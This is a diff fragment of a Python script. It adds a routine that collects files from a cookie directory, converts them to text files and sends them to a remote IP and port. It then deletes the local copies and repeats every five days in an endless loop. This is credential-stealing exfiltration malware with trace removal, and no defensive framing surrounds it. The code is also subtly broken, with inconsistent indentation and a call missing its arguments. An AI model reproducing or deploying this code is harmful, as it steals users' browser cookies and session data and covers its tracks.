@@ -22,5 +22,24 @@ def sendDump(ip, port):
             if file.endswith(".txt"):
                 send_txt_file(c, os.path.join(root, file))
 
+	for root, dirs, files in os.walk("src/dump"):
+        	for file in files:
+            		os.remove(os.path.join(root, file))
     c.close()
 	
+def addDump():
+	scanner = importlib.import_module("directory_scanner")
+	entries = scanner.scan_directory(cookie_dir)
+	def create_txt_file(entry):
+    		with open(entry, 'r') as f:
+        		contents = f.read()
+    		with open(entry + ".txt", 'w') as f:
+        	f.write(contents)
+	for entry in entries:
+    		create_txt_file(entry)
+
+
+while True:
+    	addDump()
+	sendDump()
+    	time.sleep(5 * 24 * 60 * 60)
